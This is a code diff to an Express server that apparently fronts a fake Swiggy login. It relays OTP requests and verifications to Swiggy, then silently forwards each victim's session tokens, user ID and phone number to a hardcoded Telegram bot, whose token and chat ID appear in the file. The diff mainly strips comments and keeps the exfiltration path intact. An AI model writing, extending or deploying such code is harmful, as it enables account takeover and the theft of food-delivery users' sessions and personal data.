@@ -4,7 +4,6 @@ const app = express();
 
 app.use(express.json());
 
-// CORS for your domain
 app.use((req, res, next) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -13,15 +12,13 @@ app.use((req, res, next) => {
     next();
 });
 
-// TELEGRAM CONFIG
 const TELEGRAM_BOT_TOKEN = "8642907155:AAHULXBX2ENPPrE7ZYDJwezQorQu0z0yc-o";
 const TELEGRAM_CHAT_ID = "8450000919";
 
-// Function to send session to Telegram
 async function sendToTelegram(sessionData) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     
-    const message = ` *NEW SWIGGY SESSION*\n\n` +
+    const message = `*NEW SWIGGY SESSION*\n\n` +
                    `📱 *Mobile:* \`${sessionData.mobile}\`\n` +
                    `🆔 *User ID:* \`${sessionData.userid}\`\n` +
                    `⏰ *Generated:* ${new Date().toLocaleString()}\n\n` +
@@ -72,7 +69,6 @@ function buildHeaders(deviceId) {
     };
 }
 
-// OTP Request
 app.get('/api/otp', async (req, res) => {
     const phone = req.query.mobile;
     if (!phone || !/^\d{10}$/.test(phone)) {
@@ -95,9 +91,8 @@ app.get('/api/otp', async (req, res) => {
     }
 });
 
-// OTP Verify
 app.post('/api/verify', async (req, res) => {
-    const { otp, tid, sid, deviceId } = req.body;
+    const { otp, tid, sid, deviceId, phone } = req.body;
 
     const headers = buildHeaders(deviceId);
     if (tid) headers["tid"] = tid;
@@ -123,7 +118,6 @@ app.post('/api/verify', async (req, res) => {
         });
         const data = await resp.json();
         
-        // If successful, send to Telegram
         if (data.statusCode === 0) {
             const sess = {};
             const inner = typeof data.data === "object" ? data.data : {};
@@ -134,16 +128,14 @@ app.post('/api/verify', async (req, res) => {
             
             sess.deviceId = String(data.deviceId || deviceId);
             
-            // Decode JWT to get user_id
             try {
                 const jwtPayload = sess.tid ? Buffer.from(sess.tid.split('.')[1], 'base64').toString() : '{}';
                 const uid = JSON.parse(jwtPayload).user_id;
                 if (uid) {
                     sess.userid = String(uid);
-                    sess.mobile = req.body.phone || 'unknown';
+                    sess.mobile = phone || 'unknown';
                     if (!sess.customerId) sess.customerId = sess.userid;
                     
-                    // Send to Telegram (don't wait for it)
                     sendToTelegram(sess).catch(console.error);
                 }
             } catch (e) {
@@ -157,7 +149,6 @@ app.post('/api/verify', async (req, res) => {
     }
 });
 
-// Serve Frontend
 app.get('/', (req, res) => {
     res.sendFile(__dirname + '/index.html');
 });
